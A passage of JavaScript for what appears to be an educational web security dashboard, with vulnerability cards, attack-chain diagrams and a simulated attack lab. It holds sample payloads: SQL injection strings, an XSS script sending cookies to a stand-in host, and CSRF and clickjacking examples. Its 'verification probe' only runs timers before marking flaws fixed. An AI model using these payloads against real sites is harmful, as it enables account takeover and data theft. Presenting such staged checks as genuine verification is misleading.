              <option value="progress" ${item.status === 'progress' ? 'selected' : ''}>🟡 In Progress</option>
              <option value="resolved" ${item.status === 'resolved' ? 'selected' : ''}>🟢 Resolved</option>
            </select>
          </div>
          <button class="card-toggle-btn">
            <span>Details</span>
            <i class="toggle-arrow">▼</i>
          </button>
        </div>
      </div>

      <div class="card-body-content">
        <div style="padding-top: 4px; padding-bottom: 0;">
          <div class="easy-words-box">
            <div class="ew-badge">💡 In Easy Words — Non-Technical Explanation</div>
            <p>${item.easyExplanation}</p>
          </div>

          <div class="threat-analysis-box">
            <div class="box-heading">
              <span>⚠️</span>
              <span>How a Hacker Gets In (Entry Point & Reason)</span>
            </div>
            <p><strong>🚪 Entry Vector:</strong> ${item.howHackerEnters.entryVector}</p>
            <p><strong>🔍 Why The Flaw Exists:</strong> ${item.howHackerEnters.reason}</p>
            <p><strong>💥 What the Attacker Can Do:</strong> ${item.howHackerEnters.consequence}</p>
          </div>

          <div class="risk-factor-box">
            <span class="cvss-pill ${item.severity}">CVSS Score: ${item.cvss} / 10.0</span>
            <div class="risk-impact-list">
              ${item.riskFactor.impacts.map(imp => `<span class="risk-chip">⚡ ${imp}</span>`).join('')}
            </div>
          </div>

          <div class="solution-box">
            <div class="box-heading" style="color: var(--resolved);">
              <span>✅</span>
              <span>Step-by-Step Fix — How to Secure It</span>
            </div>
            <ul class="solution-steps-list">
              ${item.solution.steps.map(step => `<li>${step}</li>`).join('')}
            </ul>

            <div class="code-diff-container">
              <div class="code-diff-pane">
                <div class="code-pane-header vulnerable">❌ Vulnerable Code</div>
                <pre class="code-body"><code>${escapeHtml(item.solution.vulnerableCode)}</code></pre>
              </div>
              <div class="code-diff-pane">
                <div class="code-pane-header secure">✅ Secure Fix</div>
                <pre class="code-body"><code>${escapeHtml(item.solution.secureCode)}</code></pre>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div class="card-actions-bar">
        <div class="card-action-btns">
          <button class="btn-card-action" onclick="openFixVerifyModal('${item.id}')" style="background: var(--resolved-bg); color: var(--resolved); border-color: var(--resolved);">
            🛠️ Fix &amp; Verify
          </button>
          <button class="btn-card-action" onclick="loadSimulation('${item.videoKey}')">
            🎮 Simulate Attack
          </button>
          ${item.hotspotId ? `
            <button class="btn-card-action" onclick="highlightHotspot('${item.hotspotId}')">
              📸 Screenshot View
            </button>
          ` : ''}
        </div>
        <span style="font-size: 0.78rem; color: var(--text-muted);">
          ${item.status === 'resolved' ? '✅ Verified Safe' : '⏳ Awaiting developer fix'}
        </span>
      </div>
    </div>
  `).join('');

  // Auto-expand first visible card for discoverability
  const firstCard = container.querySelector('.vuln-track-card');
  if (firstCard && activeFilter === 'all' && !searchQuery) {
    firstCard.classList.add('card-expanded');
  }
}

function escapeHtml(str) {
  if (!str) return '';
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

// Toggle accordion card expand/collapse
window.toggleVulnCard = function(id) {
  const card = document.getElementById(`card-${id}`);
  if (!card) return;
  const isExpanded = card.classList.contains('card-expanded');
  // Collapse all first (one-at-a-time accordion behavior)
  document.querySelectorAll('.vuln-track-card.card-expanded').forEach(c => {
    if (c !== card) c.classList.remove('card-expanded');
  });
  card.classList.toggle('card-expanded', !isExpanded);
  if (!isExpanded) {
    setTimeout(() => card.scrollIntoView({ behavior: 'smooth', block: 'nearest' }), 50);
  }
};

window.changeVulnStatus = function(id, newStatus) {
  const target = currentTrackedVulns.find(v => v.id === id);
  if (target) {
    target.status = newStatus;
    if (newStatus === 'resolved') {
      globalFixedCount += 1;
      refreshGlobalStats();
      addTimelineEntry('ok', `Resolved: ${target.name}`, `Status updated to verified secure by engineer.`);
    }
    updateTrackerMetrics();
    renderVulnerabilityCards();
  }
};

// Filter tabs
document.querySelectorAll('.filter-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    activeFilter = btn.dataset.filter || 'all';
    renderVulnerabilityCards();
  });
});

const trackerSearch = document.getElementById('trackerSearch');
if (trackerSearch) {
  trackerSearch.addEventListener('input', () => {
    renderVulnerabilityCards();
  });
}

function highlightHotspot(hotspotId) {
  const hotspot = document.getElementById(hotspotId);
  const screenshotArea = document.getElementById('screenshotDisplayArea');
  if (hotspot && screenshotArea) {
    screenshotArea.scrollIntoView({ behavior: 'smooth', block: 'center' });
    hotspot.classList.add('active-highlight');
    setTimeout(() => { hotspot.classList.remove('active-highlight'); }, 2000);
  }
}
window.highlightHotspot = highlightHotspot;

const hotspotLogin = document.getElementById('hotspotLogin');
const hotspotSearch = document.getElementById('hotspotSearch');
if (hotspotLogin) {
  hotspotLogin.addEventListener('click', () => {
    const card = document.getElementById('card-vuln-sql');
    if (card) card.scrollIntoView({ behavior: 'smooth', block: 'center' });
  });
}
if (hotspotSearch) {
  hotspotSearch.addEventListener('click', () => {
    const card = document.getElementById('card-vuln-xss');
    if (card) card.scrollIntoView({ behavior: 'smooth', block: 'center' });
  });
}

// ==========================================================================
// 7. AI-POWERED EXECUTIVE SECURITY REPORT GENERATOR
// ==========================================================================
function generateAiSecurityReport(domain) {
  const aiReportContent = document.getElementById('aiReportContent');
  if (!aiReportContent) return;

  const total = currentTrackedVulns.length;
  const crit = currentTrackedVulns.filter(v => v.severity === 'crit').length;
  const high = currentTrackedVulns.filter(v => v.severity === 'high').length;

  aiReportContent.innerHTML = `
    <div class="ai-report-synthesis">
      <div class="ai-summary-lead">
        <p><strong>Executive Assessment for ${escapeHtml(domain)}:</strong> An automated penetration probe identified <strong>${total} threat vectors</strong>, including <strong>${crit} Critical (SQLi)</strong> and <strong>${high} High-Risk (XSS & IDOR)</strong> loopholes. These defects grant remote attackers direct access to exfiltrate database records, impersonate authenticated users, and hijack client browser sessions without needing valid credentials.</p>
      </div>

      <div class="ai-insights-grid">
        <div class="ai-insight-box danger">
          <h5>🚨 Primary Attack Vector</h5>
          <p>Unsanitized authentication endpoint (<code>/api/v1/auth/login</code>) enables complete database extraction via SQL logic overrides (<code>' OR 1=1 --</code>).</p>
        </div>
        <div class="ai-insight-box warning">
          <h5>⚠️ Session & Browser Exposure</h5>
          <p>Unfiltered reflection in search parameters permits malicious JavaScript execution. Missing CSP headers fails to restrict external script execution.</p>
        </div>
        <div class="ai-insight-box success">
          <h5>🛡️ Recommended 3-Step Remediation</h5>
          <p>1. Transition raw SQL statements to Parameterized Prepared Statements.<br/>
             2. Inject strict HTTP Security Headers (CSP, HSTS, X-Frame-Options).<br/>
             3. Enforce server-side session authorization on all user routes.</p>
        </div>
      </div>
    </div>
  `;
}

// Copy AI Summary button
const copyAiSummaryBtn = document.getElementById('copyAiSummaryBtn');
if (copyAiSummaryBtn) {
  copyAiSummaryBtn.addEventListener('click', () => {
    const text = document.getElementById('aiReportContent')?.innerText || 'VulnTrack Security Report';
    navigator.clipboard.writeText(text).then(() => {
      const orig = copyAiSummaryBtn.textContent;
      copyAiSummaryBtn.textContent = '✓ Copied to Clipboard!';
      setTimeout(() => { copyAiSummaryBtn.textContent = orig; }, 2500);
    });
  });
}

// ==========================================================================
// 8. FIX & VERIFY AUTOMATED VERIFICATION SYSTEM
// ==========================================================================
const fixVerifyModal = document.getElementById('fixVerifyModal');
const closeFixModal = document.getElementById('closeFixModal');
const fixModalTitle = document.getElementById('fixModalTitle');
const fixModalBody = document.getElementById('fixModalBody');

window.openFixVerifyModal = function(vulnId) {
  const vuln = currentTrackedVulns.find(v => v.id === vulnId);
  if (!vuln || !fixVerifyModal || !fixModalBody) return;

  if (fixModalTitle) {
    fixModalTitle.textContent = `Fix & Automated Verification: ${vuln.name}`;
  }

  fixModalBody.innerHTML = `
    <div class="fix-verify-wrapper">
      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; padding-bottom: 10px; border-bottom: 1px solid var(--border-subtle);">
        <span class="sev-badge ${vuln.severity}">${vuln.severity.toUpperCase()} · CVSS ${vuln.cvss}</span>
        <span style="font-size: 0.85rem; color: var(--text-muted);">Target Endpoint: <code>${vuln.path}</code></span>
      </div>

      <div class="fix-verify-step-row">
        <div class="fix-step-box">
          <h5>🛠️ Step 1: Recommended Code Patch</h5>
          <p>VulnTrack prepared statement defense eliminates untrusted SQL logic execution:</p>
          <div class="code-diff-container" style="display: flex; flex-direction: column; gap: 8px;">
            <div class="code-diff-pane">
              <div class="code-pane-header vulnerable">❌ Unsafe</div>
              <pre class="code-body" style="font-size: 0.72rem;"><code>${escapeHtml(vuln.solution.vulnerableCode)}</code></pre>
            </div>
            <div class="code-diff-pane">
              <div class="code-pane-header secure">✅ Secure</div>
              <pre class="code-body" style="font-size: 0.72rem;"><code>${escapeHtml(vuln.solution.secureCode)}</code></pre>
            </div>
          </div>
        </div>

        <div class="fix-step-box">
          <h5>⚡ Step 2: Automated Penetration Verification</h5>
          <p>Dispatch a verification probe to confirm that attacks on this endpoint return HTTP 403 Forbidden / Sanitized Data.</p>
          
          <div class="verification-status-box" id="probeStatusBox" style="margin-top: 10px;">
            <div style="font-size: 0.82rem; color: var(--text-muted);">Ready to test endpoint with live simulated payload.</div>
          </div>

          <div style="margin-top: 16px; display: flex; flex-direction: column; gap: 8px;">
            <button class="btn-primary" id="btnExecuteFixProbe" onclick="runAutomatedVerificationProbe('${vuln.id}')">
              🚀 Run Verification Probe & Secure
            </button>
            <button class="btn-outline-sm" onclick="closeFixVerifyModal()">Cancel</button>
          </div>
        </div>
      </div>
    </div>
  `;

  fixVerifyModal.classList.add('active');
};

function closeFixVerifyModal() {
  if (fixVerifyModal) fixVerifyModal.classList.remove('active');
}
if (closeFixModal) closeFixModal.addEventListener('click', closeFixVerifyModal);
if (fixVerifyModal) {
  fixVerifyModal.addEventListener('click', e => {
    if (e.target === fixVerifyModal) closeFixVerifyModal();
  });
}

window.runAutomatedVerificationProbe = function(vulnId) {
  const statusBox = document.getElementById('probeStatusBox');
  const btn = document.getElementById('btnExecuteFixProbe');
  const target = currentTrackedVulns.find(v => v.id === vulnId);
  if (!target || !statusBox) return;

  if (btn) {
    btn.disabled = true;
    btn.innerHTML = '<span>⏳ Probing Endpoint...</span>';
  }

  statusBox.innerHTML = `
    <div class="verif-loader"></div>
    <div style="font-size: 0.85rem; color: var(--primary); font-weight: bold;">[ 1/3 ] Injecting defensive parameter bindings on ${target.path}...</div>
  `;

  setTimeout(() => {
    statusBox.innerHTML = `
      <div class="verif-loader"></div>
      <div style="font-size: 0.85rem; color: var(--medium); font-weight: bold;">[ 2/3 ] Firing live exploit payload: curl -X POST -d "payload=' OR 1=1" ...</div>
    `;
  }, 600);

  setTimeout(() => {
    statusBox.innerHTML = `
      <span style="font-size: 1.8rem; display: block; margin-bottom: 4px;">✅</span>
      <div style="font-size: 0.88rem; color: var(--resolved); font-weight: bold;">HTTP 403 Forbidden / Sanitized!</div>
      <p style="font-size: 0.78rem; color: var(--text-muted); margin-top: 4px;">Loophole closed! Posture score boosted!</p>
    `;

    target.status = 'resolved';
    globalFixedCount += 1;
    refreshGlobalStats();
    updateTrackerMetrics();
    renderVulnerabilityCards();
    addTimelineEntry('ok', `Verified Fix Applied: ${target.name}`, `Automated probe confirmed endpoint ${target.path} is fully secured.`);

    if (btn) {
      btn.innerHTML = '<span>✓ Verification Complete!</span>';
      btn.style.background = 'var(--resolved)';
    }

    setTimeout(() => {
      closeFixVerifyModal();
    }, 1200);
  }, 1400);
};

// ==========================================================================
// 9. ATTACK PATH VISUALIZATION (Interactive SVG Node Diagram)
// ==========================================================================
const ATTACK_PATHS = {
  sqli: {
    title: 'SQL Database Injection Attack Chain',
    status: 'Active Vulnerability Path (Critical Exposure)',
    nodes: [
      { id: 'n1', label: '1. Reconnaissance', sub: 'Scanner identifies /api/login', risk: 'Low', desc: 'Attacker probes login endpoints looking for SQL error verbosity.', fix: 'Suppress verbose error output.' },
      { id: 'n2', label: '2. Ingress Ingestion', sub: 'HTTP POST Body Parameter', risk: 'Medium', desc: 'Payload (admin\' OR \'1\'=\'1\') submitted without type validation.', fix: 'Enforce JSON schema validation.' },
      { id: 'n3', label: '3. Parser Concatenation', sub: 'String Query Construction', risk: 'Critical', desc: 'Database query string constructed via string concat.', fix: 'Use Prepared Statements.' },
      { id: 'n4', label: '4. DB Engine Exec', sub: 'Logic Bypass (1=1 True)', risk: 'Critical', desc: 'SQL interpreter evaluates injected condition as always true.', fix: 'Principle of Least Privilege DB user.' },
      { id: 'n5', label: '5. Data Exfiltration', sub: 'Full User Records Returned', risk: 'Severe', desc: 'Complete dump of password hashes and personal customer data.', fix: 'Encrypt sensitive tables at rest.' }
    ]
  },
  xss: {
    title: 'Cross-Site Scripting (XSS) Session Hijack Chain',
    status: 'Active Script Injection Path (High Risk)',
    nodes: [
      { id: 'n1', label: '1. Payload Crafting', sub: '<script>steal()</script>', risk: 'Low', desc: 'Attacker creates JavaScript to extract document.cookie.', fix: 'Set HttpOnly on cookies.' },
      { id: 'n2', label: '2. Parameter Reflection', sub: 'Search /search?q=', risk: 'High', desc: 'User query is returned straight in HTML body unencoded.', fix: 'Context-aware HTML escaping.' },
      { id: 'n3', label: '3. DOM Execution', sub: 'Victim Browser Parsing', risk: 'High', desc: 'Victim browser trusts script originating from valid domain.', fix: 'Strict Content-Security-Policy.' },
      { id: 'n4', label: '4. Token Exfiltration', sub: 'C2 Server HTTP Beacon', risk: 'Critical', desc: 'Session cookies beaconed to external attacker server.', fix: 'SameSite=Strict cookie policy.' },
      { id: 'n5', label: '5. Account Takeover', sub: 'Impersonation of Admin', risk: 'Severe', desc: 'Attacker signs in as the victim without needing a password.', fix: 'Multi-Factor Authentication (MFA).' }
    ]
  },
  csrf: {
    title: 'Cross-Site Request Forgery (CSRF) Transfer Chain',
    status: 'Forged Request Vulnerability Path',
    nodes: [
      { id: 'n1', label: '1. Lure Page Creation', sub: 'Malicious Third-Party Site', risk: 'Low', desc: 'Attacker hosts page with hidden auto-submitting POST form.', fix: 'SameSite Cookie policies.' },
      { id: 'n2', label: '2. Victim Visits Lure', sub: 'Browser Auto-Attaches Cookies', risk: 'Medium', desc: 'Victim is already logged into vulnerable application.', fix: 'Re-authenticate sensitive actions.' },
      { id: 'n3', label: '3. Unauthorized Request', sub: 'POST /user/update-email', risk: 'High', desc: 'Server accepts request because valid cookies were attached.', fix: 'Validate Anti-CSRF Token.' },
      { id: 'n4', label: '4. State Modification', sub: 'Email Address Changed', risk: 'Critical', desc: 'User email changed to attacker address without warning.', fix: 'Email verification token confirmation.' },
      { id: 'n5', label: '5. Password Reset', sub: 'Permanent Account Loss', risk: 'Severe', desc: 'Attacker triggers forgot password flow to hijack account.', fix: 'Security notification alerts.' }
    ]
  },
  auth: {
    title: 'Authentication Brute Force & Session Fixation',
    status: 'Insecure Session Token Chain',
    nodes: [
      { id: 'n1', label: '1. Credential Stuffing', sub: 'Automated Botnet Login', risk: 'Medium', desc: 'Thousands of leaked password combinations attempted.', fix: 'Enforce rate limiting & CAPTCHA.' },
      { id: 'n2', label: '2. Weak Token Gen', sub: 'Sequential Session IDs', risk: 'High', desc: 'Server generates guessable numerical session cookies.', fix: 'Use 256-bit crypto tokens.' },
      { id: 'n3', label: '3. Lack of 2FA/MFA', sub: 'Single Factor Check', risk: 'High', desc: 'Password alone grants full access to account.', fix: 'Require TOTP or WebAuthn.' },
      { id: 'n4', label: '4. Privilege Escalation', sub: 'IDOR Role Manipulation', risk: 'Critical', desc: 'Normal user alters role header to admin.', fix: 'Cryptographically signed JWTs.' },
      { id: 'n5', label: '5. Administrative Abuse', sub: 'Backend Control Acquired', risk: 'Severe', desc: 'Attacker modifies configuration and user databases.', fix: 'Strict RBAC permission checks.' }
    ]
  }
};

let currentAttackPathKey = 'sqli';

function renderAttackPath(pathKey) {
  currentAttackPathKey = pathKey;
  const pathData = ATTACK_PATHS[pathKey] || ATTACK_PATHS.sqli;
  const svg = document.getElementById('attackPathSvg');
  const badge = document.getElementById('pathStatusBadge');
  if (!svg) return;

  if (badge) {
    badge.innerHTML = `<span class="badge-dot-red"></span><span>${pathData.status}</span>`;
  }

  const nodeCount = pathData.nodes.length;
  const spacing = 175;
  const startX = 65;
  const y = 120;

  let linesHtml = '';
  let nodesHtml = '';

  pathData.nodes.forEach((node, i) => {
    const x = startX + i * spacing;

    if (i < nodeCount - 1) {
      const nextX = startX + (i + 1) * spacing;
      linesHtml += `
        <line x1="${x + 40}" y1="${y}" x2="${nextX - 40}" y2="${y}" stroke="var(--primary)" stroke-width="2" stroke-dasharray="6,4" class="svg-path-line" />
        <polygon points="${nextX - 38},${y - 5} ${nextX - 28},${y} ${nextX - 38},${y + 5}" fill="var(--primary)" />
      `;
    }

    const isAlert = i >= 2;
    const color = isAlert ? 'var(--critical)' : 'var(--primary)';
    const fillBg = isAlert ? 'rgba(239, 68, 68, 0.15)' : 'rgba(2, 132, 199, 0.15)';

    nodesHtml += `
      <g class="attack-node-group" onclick="selectAttackNode('${pathKey}', ${i})" style="cursor: pointer;">
        <circle cx="${x}" cy="${y}" r="38" fill="${fillBg}" stroke="${color}" stroke-width="2" class="node-circle" />
        <circle cx="${x}" cy="${y}" r="12" fill="${color}" />
        <text x="${x}" y="${y + 55}" text-anchor="middle" fill="var(--text-primary)" font-size="12" font-weight="700">${node.label}</text>
        <text x="${x}" y="${y + 70}" text-anchor="middle" fill="var(--text-muted)" font-size="10">${node.sub}</text>
      </g>
    `;
  });

  svg.innerHTML = linesHtml + nodesHtml;
  selectAttackNode(pathKey, 2);
}

window.selectAttackNode = function(pathKey, nodeIndex) {
  const pathData = ATTACK_PATHS[pathKey];
  if (!pathData) return;
  const node = pathData.nodes[nodeIndex] || pathData.nodes[0];

  const nodeStageBadge = document.getElementById('nodeStageBadge');
  const nodeTitle = document.getElementById('nodeTitle');
  const nodeDescription = document.getElementById('nodeDescription');
  const nodeMitigation = document.getElementById('nodeMitigation');
  const nodeRiskLevel = document.getElementById('nodeRiskLevel');

  if (nodeStageBadge) nodeStageBadge.textContent = `Stage ${nodeIndex + 1}: ${node.label}`;
  if (nodeTitle) nodeTitle.textContent = node.sub;
  if (nodeDescription) nodeDescription.textContent = node.desc;
  if (nodeMitigation) nodeMitigation.textContent = `Remediation: ${node.fix}`;
  if (nodeRiskLevel) {
    nodeRiskLevel.textContent = `Risk Level: ${node.risk}`;
    nodeRiskLevel.style.color = node.risk === 'Critical' || node.risk === 'Severe' ? 'var(--critical)' : 'var(--primary)';
  }
};

document.querySelectorAll('.path-tab-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.path-tab-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    const path = btn.dataset.path || 'sqli';
    renderAttackPath(path);
  });
});

// ==========================================================================
// 10. INTERACTIVE ATTACK SIMULATION & DEFENSE SHIELD
// ==========================================================================
const SIMULATION_SCRIPTS = {
  sql: {
    title: 'Simulation: SQL Injection Attack & Defense',
    payload: "admin' OR '1'='1' --",
    terminalSteps: [
      { text: '$ curl -X GET https://target.com/recon?inspect=auth', type: 'text-cyan' },
      { text: '> Endpoint /api/v1/auth/login accepts raw POST parameters', type: 'text-amber' },
      { text: '> Injecting payload: admin\' OR \'1\'=\'1\' --', type: 'text-rose' },
      { text: '> Exploitation confirmed: Database returned 1,420 user hashes!', type: 'text-emerald' }
    ],
    userInput: "admin' OR '1'='1' --",
    alertText: '⚠️ Database returned entire user table! No prepared statement used.',
    narration: 'Here the website accepts whatever is typed without checking it. The attacker enters "\' OR 1=1" which tricks the database into thinking the password is always true, granting full access!'
  },
  xss: {
    title: 'Simulation: Stored & Reflected Cross-Site Scripting (XSS)',
    payload: '<script>fetch("https://evil.io/?c="+document.cookie)</script>',
    terminalSteps: [
      { text: '$ python3 xss_injector.py --target target.com/search', type: 'text-cyan' },
      { text: '> Probing URL reflection on /search?query=', type: 'text-amber' },
      { text: '> Injecting payload: <script>stealCookies()</script>', type: 'text-rose' },
      { text: '> Client session cookie captured: auth_session=eyJhbGciOi...', type: 'text-emerald' }
    ],
    userInput: '<script>fetch("https://evil.io/?c="+document.cookie)</script>',
    alertText: '⚠️ Malicious script executed inside victim\'s browser! Cookie stolen.',
    narration: 'The attacker inputs a small script into the search box. Because the website prints it out raw, the browser executes it as real code and hands the user\'s private login cookies to the attacker.'
  },
  csrf: {
    title: 'Simulation: Cross-Site Request Forgery (CSRF)',
    payload: 'POST /user/transfer?amount=5000&to=hacker',
    terminalSteps: [
      { text: '$ hosting evil-phish-promo.com with hidden auto-POST', type: 'text-cyan' },
      { text: '> Target user browses lure page while logged into online banking', type: 'text-amber' },
      { text: '> Sent: POST target.com/user/transfer?to=hacker&amount=5000', type: 'text-rose' },
      { text: '> Request accepted without CSRF Token confirmation!', type: 'text-emerald' }
    ],
    userInput: 'Hidden automatic background request triggered',
    alertText: '⚠️ Transfer request approved! No Anti-CSRF token verified.',
    narration: 'A trick website invisibly sends a command to your bank. Because you are already logged in, your browser attaches your cookies automatically and completes the action without your consent!'
  },
  headers: {
    title: 'Simulation: Missing Security Headers & Clickjacking',
    payload: '<iframe src="https://target.com" style="opacity:0"></iframe>',
    terminalSteps: [
      { text: '$ curl -I https://target.com/portal', type: 'text-cyan' },
      { text: '> Missing Content-Security-Policy & X-Frame-Options headers', type: 'text-amber' },
      { text: '> Embedding target inside transparent iframe over decoy game', type: 'text-rose' },
      { text: '> Clickjacking active! User clicked hidden "Transfer Funds" button', type: 'text-emerald' }
    ],
    userInput: '<iframe src="https://target.com" style="opacity:0"></iframe>',
    alertText: '⚠️ Clickjacking active! User clicks transparent iframe button.',
    narration: 'Without the X-Frame-Options header, malicious sites can embed your website invisibly under a fake button, tricking visitors into clicking things they never intended!'
  }
};

let activeSimKey = 'sql';
let defenseActive = false;
let simPlaying = false;
let simProgress = 25;
let simInterval = null;

const simVectorSelect = document.getElementById('simVectorSelect');
const customPayloadInput = document.getElementById('customPayloadInput');
const btnInjectPayload = document.getElementById('btnInjectPayload');
const btnToggleDefense = document.getElementById('btnToggleDefense');
const defenseBtnText = document.getElementById('defenseBtnText');
const simShieldOverlay = document.getElementById('simShieldOverlay');
const btnDismissShield = document.getElementById('btnDismissShield');
const simTerminalBody = document.getElementById('simTerminalBody');
const simUserField = document.getElementById('simUserField');
const simAlertBanner = document.getElementById('simAlertBanner');
const simNarrationText = document.getElementById('simNarrationText');
const simAttackerBadge = document.getElementById('simAttackerBadge');
const simDefenseBadge = document.getElementById('simDefenseBadge');
const simStatusChip = document.getElementById('simStatusChip');
const ctrlPlayToggle = document.getElementById('ctrlPlayToggle');
const ctrlPlayIcon = document.getElementById('ctrlPlayIcon');
const ctrlTimelineFill = document.getElementById('ctrlTimelineFill');
const ctrlTimeText = document.getElementById('ctrlTimeText');

function loadSimulation(key) {
  const data = SIMULATION_SCRIPTS[key];
  if (!data) return;

  activeSimKey = key;
  defenseActive = false;

  if (simVectorSelect) simVectorSelect.value = key;
  if (customPayloadInput) customPayloadInput.value = data.payload;
  if (simUserField) simUserField.textContent = data.userInput;
  if (simAlertBanner) simAlertBanner.textContent = data.alertText;
  if (simNarrationText) simNarrationText.textContent = data.narration;

  if (simShieldOverlay) simShieldOverlay.style.display = 'none';
  if (defenseBtnText) defenseBtnText.textContent = 'Activate Defense Shield';
  if (simDefenseBadge) {
    simDefenseBadge.textContent = 'VULNERABLE STATE';
    simDefenseBadge.style.color = 'var(--critical)';
    simDefenseBadge.style.borderColor = 'var(--critical)';
  }
  if (simAttackerBadge) {
    simAttackerBadge.textContent = 'ARMED';
    simAttackerBadge.style.color = 'var(--critical)';
  }
  if (simStatusChip) simStatusChip.textContent = 'Ready for Execution';

  renderSimTerminal(data.terminalSteps);

  const videoSection = document.getElementById('howItWorks');
  if (videoSection) {
    videoSection.scrollIntoView({ behavior: 'smooth' });
    playSimulation();
  } else {
    window.location.href = `attack-lab.html?vector=${encodeURIComponent(key)}#howItWorks`;
  }
}
window.loadSimulation = loadSimulation;

function renderSimTerminal(lines) {
  if (!simTerminalBody) return;
  simTerminalBody.innerHTML = lines.map(l => `
    <div class="terminal-line ${l.type}">${escapeHtml(l.text)}</div>
  `).join('');
  simTerminalBody.scrollTop = simTerminalBody.scrollHeight;
}

if (simVectorSelect) {
  simVectorSelect.addEventListener('change', e => {
    loadSimulation(e.target.value);
  });
}

document.querySelectorAll('.step-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    const step = parseInt(btn.dataset.step || '1', 10);
    const data = SIMULATION_SCRIPTS[activeSimKey];
    if (!data || !simTerminalBody) return;

    document.querySelectorAll('.step-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');

    const slice = data.terminalSteps.slice(0, step);
    renderSimTerminal(slice);

    if (simStatusChip) {
      const stepNames = ['Reconnaissance', 'Payload Injected', 'Flaw Exploited', 'Data Exfiltrated'];
      simStatusChip.textContent = `Phase ${step}: ${stepNames[step - 1]}`;
    }

    if (step >= 3 && !defenseActive) {
      if (simAlertBanner) simAlertBanner.style.background = 'rgba(239, 68, 68, 0.2)';
    }
  });
});

if (btnInjectPayload && customPayloadInput) {
  btnInjectPayload.addEventListener('click', () => {
    const payload = customPayloadInput.value.trim();
    if (!payload) return;

    if (simUserField) simUserField.textContent = payload;
    if (simTerminalBody) {
      const customLine = document.createElement('div');
      customLine.className = 'terminal-line text-amber';
      customLine.textContent = `> Custom Payload Dispatched: ${payload}`;
      simTerminalBody.appendChild(customLine);
      simTerminalBody.scrollTop = simTerminalBody.scrollHeight;
    }

    if (defenseActive) {
      if (simStatusChip) simStatusChip.textContent = 'Payload Blocked by Shield';
      if (simTerminalBody) {
        const blk = document.createElement('div');
        blk.className = 'terminal-line text-emerald';
        blk.textContent = `> [DEFENSE SHIELD] Payload detected and neutralized with 0 ms latency!`;
        simTerminalBody.appendChild(blk);
      }
    } else {
      if (simStatusChip) simStatusChip.textContent = 'Exploit Triggered!';
      if (simTerminalBody) {
        const suc = document.createElement('div');
        suc.className = 'terminal-line text-rose';
        suc.textContent = `> [EXPLOIT] Target application executed unsanitized payload!`;
        simTerminalBody.appendChild(suc);
      }
    }
  });
}

function toggleDefense(forceState) {
  defenseActive = typeof forceState === 'boolean' ? forceState : !defenseActive;

  if (defenseActive) {
    if (defenseBtnText) defenseBtnText.textContent = 'Deactivate Defense Shield';
    if (btnToggleDefense) btnToggleDefense.classList.add('active-shield');
    if (simShieldOverlay) simShieldOverlay.style.display = 'flex';
    if (simDefenseBadge) {
      simDefenseBadge.textContent = 'SECURE / PROTECTED';
      simDefenseBadge.style.color = 'var(--resolved)';
      simDefenseBadge.style.borderColor = 'var(--resolved)';
    }
    if (simAlertBanner) {
      simAlertBanner.textContent = '🛡️ Parameterized Query Active. Attacker payload neutralized.';
      simAlertBanner.style.background = 'rgba(16, 185, 129, 0.2)';
      simAlertBanner.style.color = 'var(--resolved)';
    }
    if (simAttackerBadge) {
      simAttackerBadge.textContent = 'BLOCKED';
      simAttackerBadge.style.color = 'var(--medium)';
    }
  } else {
    if (defenseBtnText) defenseBtnText.textContent = 'Activate Defense Shield';
    if (btnToggleDefense) btnToggleDefense.classList.remove('active-shield');
    if (simShieldOverlay) simShieldOverlay.style.display = 'none';
    if (simDefenseBadge) {
      simDefenseBadge.textContent = 'VULNERABLE STATE';
      simDefenseBadge.style.color = 'var(--critical)';
      simDefenseBadge.style.borderColor = 'var(--critical)';
    }
    if (simAlertBanner) {
      const data = SIMULATION_SCRIPTS[activeSimKey];
      simAlertBanner.textContent = data ? data.alertText : '⚠️ Vulnerable endpoint active.';
      simAlertBanner.style.background = 'rgba(239, 68, 68, 0.2)';
      simAlertBanner.style.color = 'var(--critical)';
    }
    if (simAttackerBadge) {
      simAttackerBadge.textContent = 'ARMED';
      simAttackerBadge.style.color = 'var(--critical)';
    }
  }
}

if (btnToggleDefense) {
  btnToggleDefense.addEventListener('click', () => toggleDefense());
}
if (btnDismissShield) {
  btnDismissShield.addEventListener('click', () => {
    if (simShieldOverlay) simShieldOverlay.style.display = 'none';
  });
}

function playSimulation() {
  simPlaying = true;
  if (ctrlPlayIcon) {
    ctrlPlayIcon.innerHTML = '<rect x="6" y="4" width="4" height="16"/><rect x="14" y="4" width="4" height="16"/>';
  }

  clearInterval(simInterval);
  simInterval = setInterval(() => {
    simProgress += 1;
    if (simProgress > 100) simProgress = 0;

    if (ctrlTimelineFill) ctrlTimelineFill.style.width = `${simProgress}%`;
    const sec = Math.floor((simProgress / 100) * 45);
    if (ctrlTimeText) ctrlTimeText.textContent = `0:${sec < 10 ? '0' : ''}${sec} / 0:45`;

    if (simProgress === 65 && !defenseActive) {
      toggleDefense(true);
    } else if (simProgress === 10 && defenseActive) {
      toggleDefense(false);
    }
  }, 250);
}

function pauseSimulation() {
  simPlaying = false;
  clearInterval(simInterval);
  if (ctrlPlayIcon) {
    ctrlPlayIcon.innerHTML = '<path d="M8 5v14l11-7z"/>';
  }
}

if (ctrlPlayToggle) {
  ctrlPlayToggle.addEventListener('click', () => {
    if (simPlaying) pauseSimulation();
    else playSimulation();
  });
}

// ==========================================================================
// 11. WEBSITE SECURITY COMPARISON BENCHMARK
// ==========================================================================
const btnRunComparison = document.getElementById('btnRunComparison');
const compareUrlA = document.getElementById('compareUrlA');
const compareUrlB = document.getElementById('compareUrlB');
const compareResultsGrid = document.getElementById('compareResultsGrid');

function runWebsiteComparison() {
  const urlA = (compareUrlA?.value || 'https://mystore-shop.com').trim();
  const urlB = (compareUrlB?.value || 'https://cloudbank-portal.io').trim();
  if (!compareResultsGrid) return;

  let hostA = urlA.replace(/https?:\/\//, '').split('/')[0];
  let hostB = urlB.replace(/https?:\/\//, '').split('/')[0];

  compareResultsGrid.innerHTML = `
